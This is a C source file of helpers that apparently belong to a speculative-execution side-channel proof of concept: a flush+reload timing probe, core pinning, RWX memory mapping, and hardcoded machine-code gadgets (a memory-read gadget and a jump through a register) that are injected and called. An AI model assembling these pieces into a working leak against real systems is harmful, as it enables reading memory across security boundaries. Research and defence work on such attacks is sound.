#define _GNU_SOURCE             /* See feature_test_macros(7) */
#include <sched.h>
#include <sys/mman.h>
#include <linux/mman.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>


#define THRESHOLD 0x70

void SetCoreAffinity(int coreNumber){
    int result;

    cpu_set_t  mask;
    CPU_ZERO(&mask);
    CPU_SET(coreNumber, &mask);
    result = sched_setaffinity(0, sizeof(mask), &mask);

    if(result){
        printf("failed to set affinity to core %i",coreNumber);
        exit(2);
    }

}

void flush(uint8_t *adrs)
{
    asm volatile (
        "clflush [%0]                   \n"
        "mfence             \n"
        "lfence             \n"
      :
      : "c" (adrs)
      : "rax");
}

unsigned probe(uint8_t *adrs)
{
    volatile unsigned long time;
    asm __volatile__(
        "    mfence             \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    lfence             \n"
        "    mov esi, eax       \n"
        "    mov eax,[%1]       \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    sub eax, esi       \n"
        "    clflush [%1]       \n"
        "    mfence             \n"
        "    lfence             \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx"
    );
    return time;
}

uint8_t * requestMem(uint8_t *requestedAddr, unsigned size){
    uint8_t *result;

    result = (uint8_t *)mmap(requestedAddr, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE| MAP_ANONYMOUS ,-1, 0);
    if(result!=requestedAddr && requestedAddr!=NULL){
        printf("mmap failed for %p : returned %p \n",requestedAddr,result);
        exit(1);
    }
    return result;
}




#define RET_GADGET                      "\xc3"

//mov r13,[r13]
//ret
#define RD_GADGET                       "M\x8bm\x00\xc3"


void jitForLoop(uint8_t *rwx)
{
    uint8_t g1[]="\x48\xc7\xc0\xc8\x00\x00\x00\x48\xff\xc8\x75\xfb\x0f\x31\x90\xff\x27";
    memcpy(rwx, g1, sizeof(g1));
}



uint32_t callGadget(uint8_t *code,uint8_t *rdiPtr,uint8_t *probeArray){
    asm __volatile__(
        "mov r13, %2    \n"
        "mov rdi, %1    \n"
        "call %0       \n"
        :
        : "r"(code),"m"(rdiPtr),"m"(probeArray)
        : "rdi"
    );
}

void copyLeakGadget(uint8_t *dst){
    memcpy(dst,RD_GADGET,sizeof(RD_GADGET));    
}

void copyRetGadget(uint8_t *dst){
    memcpy(dst,RET_GADGET,sizeof(RET_GADGET));    
}